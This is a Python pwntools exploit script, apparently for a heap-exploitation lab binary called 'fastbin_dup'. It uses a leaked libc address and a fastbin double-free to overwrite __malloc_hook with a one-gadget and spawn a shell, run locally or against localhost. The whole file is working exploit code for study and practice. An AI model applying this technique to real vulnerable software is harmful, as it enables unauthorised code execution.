#!/usr/bin/env python3

from pwn import *

context.terminal = ['tmux', 'splitw', '-h']
context.bits = 64
gs = '''
continue
'''

elf = context.binary = ELF('./fastbin_dup')
libc = ELF(elf.runpath + b'/libc.so.6')
rop = ROP(elf)

def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    if args.REMOTE:
        return remote('127.0.0.1', 5555)
    else:
        return process(elf.path)
r = start()

#============ exploit here ================

# index of allocated chunks
index = 0

# select the 'malloc' option; send size & data.
# returns chunk index
def malloc(size, data):
    global index
    r.sendlineafter(b'>', b'1')
    r.sendlineafter(b'size: ', f'{size}'.encode())
    r.sendlineafter(b'data: ', data)
    r.recvuntil(b'>')
    index += 1
    return index - 1

# select the "free" option; send index
def free(index):
    r.sendlineafter(b'>', b'2')
    r.sendlineafter(b'index: ', f'{index}'.encode())
    r.recvuntil(b'>')

# thankfully, this binary leaks the address of puts(), use it to resolve the libc load address
r.recvuntil(b'puts() @ ')
libc.address = int(r.recvline(), 16) - libc.sym.puts
r.timeout = 0.1

# let's start

# set username fields
#username = b'icecream'         dq &user
username = p64(0) + p64(0x31)
r.sendlineafter(b'username: ', username)
r.recvuntil(b'>')

# request two 0x30-sized chunks and fill them with data
chunk_A = malloc(0x68, b'A'*0x68)
chunk_B = malloc(0x68, b'B'*0x68)

# free willy and the first chunk :v, then the second
free(chunk_A)
free(chunk_B)
free(chunk_A)

#dup = malloc(0x68, p64(elf.sym.user))
#dup = malloc(0x68, p64(libc.sym.__free_hook - 16))
dup = malloc(0x68, p64(libc.sym.__malloc_hook - 35))

malloc(0x68, b'C')
malloc(0x68, b'D')
malloc(0x68, b'E'*19 + p64(libc.address + 0xe1fa1))

malloc(1, '')


#============= interactive ================

r.interactive()
